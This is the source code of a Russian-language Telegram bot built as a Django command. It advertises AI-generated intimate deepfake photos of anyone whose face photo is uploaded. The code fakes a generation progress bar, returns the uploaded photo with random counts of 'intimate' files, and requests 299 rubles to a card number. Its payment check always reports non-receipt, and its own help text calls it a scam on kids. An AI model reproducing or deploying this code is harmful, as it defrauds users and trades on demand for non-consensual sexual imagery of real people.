from naeb_bot.models import *

from asgiref.sync import sync_to_async
from rest_framework.authtoken.models import Token

import os, django, logging, warnings, uuid, time, random, cv2, urllib.request
warnings.filterwarnings("ignore")

from PIL import Image
import urllib.request
import numpy

from django.core.management.base import BaseCommand

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackContext,
    CallbackQueryHandler,
    ConversationHandler,
    CommandHandler,
    MessageHandler,
    filters,
)

os.environ["DJANGO_ALLOW_ASYNC_UNSAFE"] = "true"
django.setup()

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

@sync_to_async
def user_get_by_update(update: Update):
    """
        Функция обработчик, возвращающая django instance пользователя
    """

    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    if not message.chat.username:
        username = "Anonymous"
    else:
        username = message.chat.username

    instance, created = NaebBotUser.objects.update_or_create(
        username = username,
        telegram_chat_id = message.chat.id,
    )

    return instance, created

async def start(update: Update, context: CallbackContext):
    """
        Обработчик команды /start
    """
    usr, _ = await user_get_by_update(update)

    if not usr.verified_usr:
        markup = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton(
                        text="Выбери качество встраивания 🔦",
                        callback_data="dump_naeb",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="Отзывы 🌟",
                        url="https://t.me/+LZvqNEc5CUFkZmZh",
                    ),
                ],
            ])
    else:
        markup = InlineKeyboardMarkup([
            [
                    InlineKeyboardButton(
                        text="Выбери качество встраивания 🔦",
                        callback_data="dump_naeb",
                    )
            ],
            [
                InlineKeyboardButton(
                    text="Создать рассылку 🖍",
                    callback_data="create_mailing"
                ),
            ],
        ])

    await context.bot.send_message(
        usr.telegram_chat_id,
        f"👋 Привет, <b>{usr.username}</b>\n\n🤖 <b>Я - нeйpoсeть, которая генерирует пpивaтные фoтo.</b>\n\n🔐 <b>Мы используем такую новейшую технологию, как DeepFaceLab, поэтому сомневаться в качестве товара не стоит!</b>\n\n🔎 <pre>Oтпрaвьтe ботy фотографию или видео, оплатите интересующий материал, а дальше дело за нами!</pre>\n\nПoддeржкa: @ushshshhs",
        parse_mode="HTML",
        reply_markup=markup
    )

    return ConversationHandler.END

async def ask_for_message(update: Update, context: CallbackContext):
    usr, _ = await user_get_by_update(update)

    await context.bot.send_message(
        usr.telegram_chat_id,
        f"🗿 <b>{usr.username}</b>, введите сообщение для рассылки пользователям в формате HTML.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="Отменить рассылку ⛔️",
                    callback_data="stop_sending"
                ),
            ],
        ])
    )

    return 0

async def send_messages(update: Update, context: CallbackContext):
    usr, _ = await user_get_by_update(update)
    all_users = NaebBotUser.objects.all()

    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    msg = await context.bot.send_message(
        usr.telegram_chat_id,
        f"⏳ Начинаю рассылку...\n\nОтправлено <b>0</b> сообщений.",
        parse_mode="HTML",
    )

    msg_counter = 0
    for user in all_users:
        try:
            await context.bot.send_message(
                user.telegram_chat_id,
                message.text,
                parse_mode="HTML"
            )

            msg_counter += 1
            await context.bot.edit_message_text(
                text=f"⏳ Начинаю рассылку...\n\nОтправлено <b>{msg_counter}</b> сообщений.",
                chat_id=usr.telegram_chat_id,
                message_id=msg.id,
                parse_mode="HTML"
            )
            
        except Exception as e:
            logging.info(f"Ошибка по рассылке: {e}")

    await context.bot.send_message(
        usr.telegram_chat_id,
        f"😶‍🌫️ Рассылка окончена.\n\nКоличество неотправленных сообщений равно <b>{len(all_users) - msg_counter}</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="В меню 🔗",
                    callback_data="menu"
                ),
            ],
        ])
    )

    return ConversationHandler.END

async def stop_sending(update: Update, context: CallbackContext):
    usr, _ = await user_get_by_update(update)

    await context.bot.send_message(
        usr.telegram_chat_id,
        f"🚫 Рассылка отменена",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="В меню 🔗",
                    callback_data="menu"
                ),
            ],
        ])
    )

    return ConversationHandler.END
    
async def ask_for_link(update: Update, context: CallbackContext):
    usr, _ = await user_get_by_update(update)

    await context.bot.send_message(
        usr.telegram_chat_id,
        "🔥 <b>Выбери один из вариантов:</b>", 
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="🤪 EAZY",
                    callback_data="search",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚡️ MIDDLE",
                    callback_data="search",
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔥 HARD",
                    callback_data="search",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⏮️ В меню",
                    callback_data="menu",
                )
            ],
        ])
    )

    return 0

async def content(update: Update, context: CallbackContext):
    usr, _ = await user_get_by_update(update)

    await context.bot.send_message(
        usr.telegram_chat_id, 
        '<b>🖼️ Отправь фотографию лица человека:</b>',
        parse_mode="HTML"
        )
    
    return 1

async def check_photo(update: Update, context: CallbackContext):
    if update.message:
        message = update.message
    else:
        message = update.callback_query.message

    usr, _ = await user_get_by_update(update)
    
    file_info = await context.bot.get_file(message.photo[-1].file_id)
    urllib.request.urlretrieve(file_info.file_path, "gfg.png")
    
    pil_image = Image.open("gfg.png")

    context.user_data['photo_search'] = message.photo[-1].file_id
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

    gray = cv2.cvtColor(numpy.array(pil_image), cv2.COLOR_BGR2GRAY)

    faces = face_cascade.detectMultiScale(gray, 1.3, 5)
    if len(faces) != 0:
        await context.bot.send_message(
            usr.telegram_chat_id,
            '<b>✓ Лицо обнаружено ✓ \nСкорее переходи к оплате, чтобы получить доступ к контенту 😈</b>',
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="⏭️ Перейти к оплате",
                    callback_data="face_pass",
                )
            ],
        ])
        )
        
    else:
        await context.bot.send_message(
            message.chat.id,
            '<b>😔 Лицо не обнаружено\nК сожалению невозможно сгенерировать изображение без лица\n\n<pre>Выбери другую фотографию</pre></b>',
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="↩️ Попробовать еще раз",
                    callback_data="face_blocking",
                )
            ],
        ])
    )
    return 2
    
async def search(update:Update, context: CallbackContext):
    startin_text = list("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥")
    usr, _ = await user_get_by_update(update)
    
    msg = await context.bot.send_message(
        usr.telegram_chat_id,
        f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{0}%</b>\n{''.join(startin_text)}",
        parse_mode="HTML"
    )

    for index in range(len(startin_text)):
        startin_text[index] = "🟩"
        await context.bot.edit_message_text(
            f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
            usr.telegram_chat_id,
            msg.id,
            parse_mode='HTML'
        )
        time.sleep(3)

    await context.bot.send_photo(
            chat_id=usr.telegram_chat_id,
            photo=context.user_data.get('photo_search', 
            'https://www.google.com/search?q=%D1%84%D0%BE%D1%82%D0%BA%D0%B8++%D0%B4%D0%BB%D1%8F+%D1%81%D0%BB%D0%B8%D0%B2%D0%B0+%D1%82%D0%B3&tbm=isch&ved=2ahUKEwjlgK2GsKqAAxVUJhAIHbBUCC8Q2-cCegQIABAA&oq=%D1%84%D0%BE%D1%82%D0%BA%D0%B8++%D0%B4%D0%BB%D1%8F+%D1%81%D0%BB%D0%B8%D0%B2%D0%B0+%D1%82%D0%B3&gs_lcp=CgNpbWcQAzoECCMQJ1CvDFivDGDBEWgAcAB4AIABVIgBpQGSAQEymAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=SwXAZKWvHtTMwPAPsKmh-AI&bih=789&biw=1440#imgrc=KG6sDTg91r5r4M'),
            caption=f"<b>Фотографии сгенерированы</b> ✅\n\n<b>Интим фото: </b>{random.randint(5, 30)} шт.\n<b>Интим видео: </b>{random.randint(1, 3)} шт.", 
            parse_mode="HTML", 
            reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "💰 Приобрести за 299 ₽",
                    callback_data="buy_archive"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="⏮️ В меню",
                    callback_data="menu",
                )

            ]
        ]), 
        write_timeout=5,
    )

    return 3

async def confirm_paying(update: Update, context: CallbackContext):
    code = "#" + str(uuid.uuid4().hex)[:6].upper()
    context.user_data["deal_code"] = code

    usr, _ = await user_get_by_update(update)

    await context.bot.send_message(
        usr.telegram_chat_id,
        f"🤩 <b>Для получения доступа:</b>\n\nПереведите <b>299₽</b> по реквизитам ниже и в комментариях укажите номер сделки. После чего нажмите кнопку 'Проверить оплату ✅'\n\n<b><u>Реквизиты:</u></b>\n<pre>2200 7008 5830 0774</pre>\n<b><u>Номер сделки:</u></b> {code}\n\n<i>Поддержка:</i> @ushshshhs",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "Проверить оплату ✅",
                    callback_data="check_payment"
                ),
            ]
        ])
    )

    return ConversationHandler.END

async def check_payment(update: Update, context:CallbackContext):
    deal_code = context.user_data.get("deal_code", "")
    usr, _ = await user_get_by_update(update)

    msg = await context.bot.send_message(
        usr.telegram_chat_id, 
        '<b>⏳ Минуточку....</b>\nПроверяем ваш платеж.',
        parse_mode='HTML'
    )
    time.sleep(5)

    await context.bot.delete_message(usr.telegram_chat_id, msg.id)
    await context.bot.send_message(
        usr.telegram_chat_id,
        f"😢 Оплата по сделке <b>{deal_code}</b> пока не получена.\n\n<i>*Если вы оплатили, но оплата до сих пор не прошла, пишите в поддержку.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    text="⏮️ В меню",
                    callback_data="menu",
                )
            ],
            [
                InlineKeyboardButton(
                    text="⚠️ Поддержка",
                    url="https://t.me/ushshshhs",
                )
            ]
        ])
    )

async def garbage(update:Update, context:CallbackContext):
    usr, _ = await user_get_by_update(update)

    await context.bot.send_message(
        usr.telegram_chat_id,
        f"<b>{usr.username}</b>, я пока не умею обрабатывать такие запросы, поэтому воспользуйтесь меню.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(
                text="⏮️ В меню",
                callback_data="menu",
            )]
        ])        
    )

def main() -> None:
    """
        Запуск бота
    """

    application = Application.builder().token(os.environ.get("NAEB_BOT_TOKEN")).build()

    application.add_handler(CommandHandler("start", start))

    naeb_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(ask_for_link, "dump_naeb",)],
        states={
            0:[CallbackQueryHandler(content, "search",)],
            1:[MessageHandler(filters.PHOTO, check_photo)],
            2:[CallbackQueryHandler(search, "face_pass"),
               CallbackQueryHandler(content, "face_blocking")],
            3:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
        },
        fallbacks=[CallbackQueryHandler(start, "menu",)]
    )
    application.add_handler(naeb_handler)
    
    mailing_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(ask_for_message, "create_mailing")],
        states={
            0:[MessageHandler(filters.TEXT, send_messages)]
        },
        fallbacks=[CallbackQueryHandler(start, "menu"), CallbackQueryHandler(stop_sending, "stop_sending")]
    )
    application.add_handler(mailing_handler)
    
    application.add_handler(CallbackQueryHandler(start, 'menu'))
    application.add_handler(CallbackQueryHandler(check_payment, "check_payment",))
    
    
    application.add_handler(MessageHandler(filters.TEXT, garbage))
    application.run_polling()


class Command(BaseCommand):
    help = 'Команда запуска телеграм бота по обманке пиздюков'

    def handle(self, *args, **kwargs):        
        main()

        
        
        
